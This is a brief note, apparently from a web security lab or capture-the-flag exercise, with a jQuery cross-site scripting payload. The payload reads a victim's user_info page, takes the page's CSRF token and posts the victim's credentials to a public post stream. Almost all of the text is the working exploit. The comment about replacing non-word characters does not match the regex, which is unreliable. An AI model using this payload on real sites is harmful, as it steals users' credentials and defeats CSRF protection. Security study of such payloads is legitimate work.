This is the exploit code that returns the user's credentials and POSTs them to the stream. Note that all non-word characters are replaced with XXX.
This code cannot be used because it contains quotes. It must be encoded. See encoded.txt for the final exploit.

$.get("user_info", function(result){
    var data = $(result).find('td').text();
    var csrf_token = document.forms[0].elements["_csrf"].value;
    var replaced = data.replace(/^\w/g, "XXX");
    $.post("ajax/posts", { title: "THIS", body: replaced, _csrf: csrf_token } );
});